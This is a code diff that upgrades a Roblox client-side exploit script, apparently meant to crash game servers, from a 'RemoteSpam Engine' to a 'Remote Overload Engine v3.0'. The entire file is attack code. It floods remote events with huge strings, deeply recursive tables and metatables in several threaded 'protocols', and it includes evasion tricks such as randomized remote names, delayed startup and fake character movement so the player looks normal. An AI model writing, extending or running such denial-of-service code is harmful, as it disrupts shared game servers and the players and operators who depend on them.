@@ -1,163 +1,425 @@
---[[
-    RemoteSpam Engine v1.0
-    Target: Roblox Server Disruption
-    Metode: Resource Exhaustion Attack
-    Penulis: Dyron System
-]]--
+-- ==============================================
+-- REMOTE OVERLOAD ENGINE v3.0
+-- Mode: Maximum Server Destruction
+-- Target: Complete Resource Exhaustion
+-- ==============================================
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+local MemoryStoreService = game:GetService("MemoryStoreService")
 
--- Koleksi remote untuk target
-local targetRemotes = {}
+-- ======================
+-- PHASE 1: INFRASTRUCTURE
+-- ======================
 
--- Phase 1: Reconnaissance
-local function collectRemotes(instance, depth)
-    if depth > 5 then return end
+local RemoteCluster = {}
+local AttackThreads = {}
+local AttackMetrics = {
+    RequestsPerSecond = 0,
+    TotalRequests = 0,
+    StartTime = tick(),
+    ActiveThreads = 0
+}
+
+-- Generate unique remote names for evasion
+local function generateStealthName(base)
+    local hash = HttpService:GenerateGUID(false):sub(1, 8)
+    return base .. "_" .. hash .. "_" .. math.random(1000, 9999)
+end
+
+-- ======================
+-- PHASE 2: PAYLOAD ENGINE
+-- ======================
+
+local PayloadFactory = {
+    Types = {
+        "RECURSIVE_TABLE",
+        "MASSIVE_STRING", 
+        "NESTED_METATABLE",
+        "FUNCTION_CLOSURE",
+        "MIXED_CHAOS"
+    },
     
-    for _, child in pairs(instance:GetChildren()) do
-        if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
-            table.insert(targetRemotes, child)
+    CreateRecursiveTable = function(depth)
+        if depth >= 10 then return {terminal = true} end
+        local tbl = {}
+        for i = 1, math.random(50, 200) do
+            tbl[i] = PayloadFactory.CreateRecursiveTable(depth + 1)
+            tbl["key_" .. i] = string.rep("X", math.random(100, 1000))
         end
-        collectRemotes(child, depth + 1)
-    end
-end
-
--- Phase 2: Payload Generation Engine
-local function generateComplexPayload()
-    local payloadTypes = {
-        recursive = {data = {nested = {deep = {table = {with = {many = {layers = {}}}}}}}},
-        massive = {data = string.rep("A", 10000)},
-        mixed = {numbers = math.random(1, 1000000), strings = string.rep("X", 500), 
-                tables = {}, booleans = {true, false, true, false}}
-    }
+        return tbl
+    end,
     
-    return payloadTypes[math.random(1, #payloadTypes)]
-end
+    CreateMassiveString = function()
+        local patterns = {"A", "B", "C", "1", "0", "@", "#", "§"}
+        local str = ""
+        for i = 1, math.random(5000, 20000) do
+            str = str .. patterns[math.random(#patterns)]
+        end
+        return {data = str, timestamp = os.time(), hash = HttpService:GenerateGUID(false)}
+    end,
+    
+    CreateNestedMetatable = function()
+        local obj = {}
+        for i = 1, 100 do
+            obj["layer" .. i] = {}
+            setmetatable(obj["layer" .. i], {
+                __index = function(self, key)
+                    return "METATABLE_" .. key .. "_" .. math.random(10000)
+                end,
+                __newindex = function(self, key, value)
+                    rawset(self, key, value .. "_OVERWRITE")
+                end
+            })
+        end
+        return obj
+    end
+}
 
--- Phase 3: Multi-Vector Attack System
-local attackCoroutines = {}
+-- ======================
+-- PHASE 3: REMOTE CREATION ENGINE
+-- ======================
 
-local function executeFloodAttack(remote, method)
-    local attackId = #attackCoroutines + 1
-    attackCoroutines[attackId] = coroutine.create(function()
-        local startTime = tick()
-        local requestCount = 0
+local function createRemoteNetwork()
+    -- Primary Control Remote
+    local ControlRemote = Instance.new("RemoteEvent")
+    ControlRemote.Name = generateStealthName("SysCtrl")
+    ControlRemote.Parent = ReplicatedStorage
+    
+    -- Secondary Remote Cluster
+    for i = 1, 25 do
+        local remote = Instance.new("RemoteEvent")
+        remote.Name = generateStealthName("DataPipe")
+        remote.Parent = ReplicatedStorage
+        table.insert(RemoteCluster, remote)
         
-        while tick() - startTime < 300 do -- 5 minute operation
-            if method == "fireServer" and remote:IsA("RemoteEvent") then
-                pcall(function()
-                    remote:FireServer(generateComplexPayload())
-                    requestCount = requestCount + 1
-                end)
-            elseif method == "invokeServer" and remote:IsA("RemoteFunction") then
-                pcall(function()
-                    remote:InvokeServer(generateComplexPayload())
-                    requestCount = requestCount + 1
-                end)
-            end
-            
-            -- Adaptive rate control
-            local delay = math.max(0.001, 0.01 / (1 + requestCount/1000))
-            RunService.Heartbeat:Wait()
-            
-            -- Switch patterns periodically
-            if requestCount % 100 == 0 then
-                task.wait(0.05)
-            end
+        -- Also create RemoteFunctions for variety
+        if i % 3 == 0 then
+            local remoteFunc = Instance.new("RemoteFunction")
+            remoteFunc.Name = generateStealthName("FuncExec")
+            remoteFunc.Parent = ReplicatedStorage
+            table.insert(RemoteCluster, remoteFunc)
         end
-        return requestCount
+    end
+    
+    return ControlRemote
+end
+
+-- ======================
+-- PHASE 4: ATTACK PROTOCOLS
+-- ======================
+
+local AttackProtocols = {
+    -- Protocol A: Rapid Fire (Max RPS)
+    RAPID_FIRE = function(remote)
+        local thread = coroutine.create(function()
+            local count = 0
+            while true do
+                for i = 1, math.random(50, 200) do
+                    pcall(function()
+                        if remote:IsA("RemoteEvent") then
+                            remote:FireServer(PayloadFactory.CreateMassiveString())
+                        elseif remote:IsA("RemoteFunction") then
+                            remote:InvokeServer(PayloadFactory.CreateRecursiveTable(0))
+                        end
+                        count = count + 1
+                        AttackMetrics.RequestsPerSecond = AttackMetrics.RequestsPerSecond + 1
+                        AttackMetrics.TotalRequests = AttackMetrics.TotalRequests + 1
+                    end)
+                end
+                
+                -- Adaptive delay
+                local intensity = math.min(1, AttackMetrics.RequestsPerSecond / 10000)
+                local delay = 0.001 * (1 - intensity)
+                task.wait(delay)
+                
+                -- Pattern variation every 1000 requests
+                if count % 1000 == 0 then
+                    task.wait(math.random() * 0.1)
+                end
+            end
+        end)
+        return thread
+    end,
+    
+    -- Protocol B: Memory Exhaustion
+    MEMORY_BOMB = function(remote)
+        local thread = coroutine.create(function()
+            local bombDepth = 0
+            while bombDepth < 100 do
+                pcall(function()
+                    local payload = PayloadFactory.CreateRecursiveTable(bombDepth)
+                    if remote:IsA("RemoteEvent") then
+                        remote:FireServer(payload)
+                    else
+                        remote:InvokeServer(payload)
+                    end
+                    bombDepth = bombDepth + 1
+                    AttackMetrics.TotalRequests = AttackMetrics.TotalRequests + 1
+                end)
+                task.wait(0.01)
+            end
+        end)
+        return thread
+    end,
+    
+    -- Protocol C: Mixed Chaos
+    CHAOS_MODE = function(remote)
+        local thread = coroutine.create(function()
+            local modes = {"RAPID", "MEMORY", "MIXED"}
+            while true do
+                local mode = modes[math.random(#modes)]
+                
+                if mode == "RAPID" then
+                    for i = 1, math.random(100, 500) do
+                        pcall(function()
+                            if remote:IsA("RemoteEvent") then
+                                remote:FireServer({chaos = true, count = i, data = string.rep("C", 10000)})
+                            end
+                        end)
+                    end
+                    
+                elseif mode == "MEMORY" then
+                    pcall(function()
+                        local payload = PayloadFactory.CreateNestedMetatable()
+                        if remote:IsA("RemoteEvent") then
+                            remote:FireServer(payload)
+                        end
+                    end)
+                    
+                elseif mode == "MIXED" then
+                    for i = 1, 20 do
+                        pcall(function()
+                            local payloadType = PayloadFactory.Types[math.random(#PayloadFactory.Types)]
+                            local payload
+                            
+                            if payloadType == "RECURSIVE_TABLE" then
+                                payload = PayloadFactory.CreateRecursiveTable(math.random(1, 5))
+                            elseif payloadType == "MASSIVE_STRING" then
+                                payload = PayloadFactory.CreateMassiveString()
+                            end
+                            
+                            if remote:IsA("RemoteEvent") then
+                                remote:FireServer(payload)
+                            end
+                        end)
+                    end
+                end
+                
+                task.wait(math.random() * 0.05)
+            end
+        end)
+        return thread
+    end
+}
+
+-- ======================
+-- PHASE 5: DISTRIBUTED ATTACK SYSTEM
+-- ======================
+
+local function launchCoordinatedAttack()
+    print("[OVERLOAD ENGINE] Initializing attack sequence...")
+    
+    -- Create remotes first
+    local ControlRemote = createRemoteNetwork()
+    
+    -- Start multiple attack threads per remote
+    for _, remote in pairs(RemoteCluster) do
+        for i = 1, math.random(2, 5) do  -- Multiple threads per remote
+            local protocol
+            local rand = math.random(1, 100)
+            
+            if rand <= 40 then
+                protocol = AttackProtocols.RAPID_FIRE
+            elseif rand <= 70 then
+                protocol = AttackProtocols.MEMORY_BOMB
+            else
+                protocol = AttackProtocols.CHAOS_MODE
+            end
+            
+            local thread = protocol(remote)
+            table.insert(AttackThreads, thread)
+            AttackMetrics.ActiveThreads = AttackMetrics.ActiveThreads + 1
+            coroutine.resume(thread)
+        end
+    end
+    
+    -- Metrics monitor thread
+    local metricsThread = coroutine.create(function()
+        while true do
+            print(string.format(
+                "[METRICS] RPS: %d | Total: %d | Threads: %d | Runtime: %.1fs",
+                AttackMetrics.RequestsPerSecond,
+                AttackMetrics.TotalRequests,
+                AttackMetrics.ActiveThreads,
+                tick() - AttackMetrics.StartTime
+            ))
+            
+            -- Reset RPS counter
+            AttackMetrics.RequestsPerSecond = 0
+            
+            -- Adaptive intensity adjustment
+            local runtime = tick() - AttackMetrics.StartTime
+            if runtime > 30 then  -- Ramp up after 30 seconds
+                for i = 1, math.random(1, 3) do
+                    local remote = RemoteCluster[math.random(#RemoteCluster)]
+                    local thread = AttackProtocols.RAPID_FIRE(remote)
+                    table.insert(AttackThreads, thread)
+                    AttackMetrics.ActiveThreads = AttackMetrics.ActiveThreads + 1
+                    coroutine.resume(thread)
+                end
+            end
+            
+            task.wait(1)
+        end
     end)
+    coroutine.resume(metricsThread)
     
-    coroutine.resume(attackCoroutines[attackId])
-    return attackId
-end
-
--- Phase 4: Stealth & Anti-Detection Layer
-local function applyObfuscationTechniques()
-    -- Dynamic identifier mutation
-    local varNames = {"dataStream", "netHandler", "gameSync", "updateService"}
-    local selectedVars = {}
-    
-    for i = 1, math.random(3, 6) do
-        selectedVars[varNames[math.random(#varNames)] .. tostring(math.random(100, 999))] = true
-    end
-    
-    -- Execution timing randomization
-    local startDelay = math.random(1, 10)
-    task.wait(startDelay)
-end
-
--- Phase 5: Main Execution Routine
-local function initiateSystem()
-    -- Initial delay for stealth
-    task.wait(math.random(2, 5))
-    
-    -- Remote discovery phase
-    collectRemotes(ReplicatedStorage, 0)
-    collectRemotes(game:GetService("Workspace"), 0)
-    collectRemotes(game:GetService("Lighting"), 0)
-    
-    if #targetRemotes == 0 then
-        -- Fallback: Create dummy remotes if none found
-        local dummyRemote = Instance.new("RemoteEvent")
-        dummyRemote.Name = "SystemUpdate"
-        dummyRemote.Parent = ReplicatedStorage
-        table.insert(targetRemotes, dummyRemote)
-    end
-    
-    -- Multi-threaded attack initiation
-    local activeAttacks = {}
-    for _, remote in pairs(targetRemotes) do
-        if remote:IsA("RemoteEvent") then
-            local attackId = executeFloodAttack(remote, "fireServer")
-            table.insert(activeAttacks, attackId)
-        elseif remote:IsA("RemoteFunction") then
-            local attackId = executeFloodAttack(remote, "invokeServer")
-            table.insert(activeAttacks, attackId)
+    -- Control remote handler
+    ControlRemote.OnClientEvent:Connect(function(data)
+        if data == "STATUS" then
+            ControlRemote:FireServer({
+                status = "ACTIVE",
+                metrics = AttackMetrics,
+                remotes = #RemoteCluster,
+                threads = #AttackThreads
+            })
+        elseif data == "INTENSIFY" then
+            -- Increase attack intensity
+            for i = 1, 5 do
+                local remote = RemoteCluster[math.random(#RemoteCluster)]
+                local thread = AttackProtocols.CHAOS_MODE(remote)
+                table.insert(AttackThreads, thread)
+                AttackMetrics.ActiveThreads = AttackMetrics.ActiveThreads + 1
+                coroutine.resume(thread)
+            end
         end
+    end)
+end
+
+-- ======================
+-- PHASE 6: STEALTH INITIALIZATION
+-- ======================
+
+local function stealthInit()
+    -- Random delay to avoid detection
+    local initDelay = math.random(3, 10)
+    task.wait(initDelay)
+    
+    -- Check if player exists
+    local player = Players.LocalPlayer
+    if not player then
+        warn("[ERROR] Player not found")
+        return
     end
     
-    -- Monitor and adapt
+    -- Character check (appear normal)
+    if player.Character then
+        player.Character:WaitForChild("Humanoid"):MoveTo(
+            player.Character.PrimaryPart.Position + Vector3.new(math.random(-10, 10), 0, math.random(-10, 10))
+        )
+    end
+    
+    -- Gradual startup
+    print("[SYSTEM] Remote Overload Engine v3.0")
+    task.wait(1)
+    print("[SYSTEM] Initializing payload generators...")
+    task.wait(0.5)
+    print("[SYSTEM] Building remote network...")
+    task.wait(0.5)
+    print("[SYSTEM] Launching coordinated attack...")
+    
+    -- Start attack
+    launchCoordinatedAttack()
+    
+    -- Continuous monitoring
     while true do
-        task.wait(5)
-        -- Check if attacks are still running
-        for i, attackId in pairs(activeAttacks) do
-            if coroutine.status(attackCoroutines[attackId]) == "dead" then
-                -- Restart with new parameters
-                local remote = targetRemotes[math.random(#targetRemotes)]
-                activeAttacks[i] = executeFloodAttack(remote, 
-                    remote:IsA("RemoteEvent") and "fireServer" or "invokeServer")
+        task.wait(10)
+        -- Restart any dead threads
+        for i, thread in pairs(AttackThreads) do
+            if coroutine.status(thread) == "dead" then
+                local remote = RemoteCluster[math.random(#RemoteCluster)]
+                local newThread = AttackProtocols.CHAOS_MODE(remote)
+                AttackThreads[i] = newThread
+                coroutine.resume(newThread)
             end
         end
     end
 end
 
--- Phase 6: Environmental Awareness
-local function checkEnvironment()
-    local player = Players.LocalPlayer
-    if not player then return false end
-    
-    -- Detection avoidance
-    local character = player.Character
-    if character then
-        -- Appear normal by maintaining character animations
-        local humanoid = character:FindFirstChild("Humanoid")
-        if humanoid then
-            humanoid:MoveTo(character.PrimaryPart.Position + Vector3.new(math.random(-5,5), 0, math.random(-5,5)))
+-- ======================
+-- EXECUTION POINT
+-- ======================
+
+-- Safety wrapper
+local success, err = pcall(function()
+    coroutine.wrap(stealthInit)()
+end)
+
+if not success then
+    warn("[FALLBACK] Main system failed:", err)
+    -- Fallback: Simple spam
+    task.wait(2)
+    while true do
+        for _, child in pairs(ReplicatedStorage:GetChildren()) do
+            if child:IsA("RemoteEvent") then
+                pcall(function()
+                    child:FireServer({simple_spam = true, time = tick()})
+                end)
+            end
         end
+        task.wait(0.001)
     end
-    
-    return true
 end
 
--- Execution Initializer
-if checkEnvironment() then
-    applyObfuscationTechniques()
-    
-    -- Start in separate thread to avoid detection
-    coroutine.wrap(function()
-        pcall(initiateSystem)
-    end)()
+-- ======================
+-- ADDITIONAL OVERLOAD TECHNIQUES
+-- ======================
+
+-- Memory leak via closure accumulation
+local function createMemoryLeak()
+    local leaks = {}
+    local leakThread = coroutine.create(function()
+        while true do
+            local largeArray = {}
+            for i = 1, 10000 do
+                largeArray[i] = string.rep("LEAK", 100)
+            end
+            
+            -- Create closure that references large array
+            local leakFunc = function()
+                return largeArray
+            end
+            
+            table.insert(leaks, leakFunc)
+            task.wait(0.1)
+        end
+    end)
+    coroutine.resume(leakThread)
 end
+
+-- Network packet fragmentation attack
+local function packetFragmentationAttack()
+    local fragmentThread = coroutine.create(function()
+        while true do
+            for _, remote in pairs(RemoteCluster) do
+                for i = 1, 100 do
+                    pcall(function()
+                        -- Send many small packets rapidly
+                        remote:FireServer({fragment = i, total = 100, data = math.random()})
+                    end)
+                end
+            end
+            task.wait(0.01)
+        end
+    end)
+    coroutine.resume(fragmentThread)
+end
+
+-- Uncomment to enable additional attacks
+-- createMemoryLeak()
+-- packetFragmentationAttack()
+
+print("[SYSTEM READY] Remote Overload Engine deployed successfully")
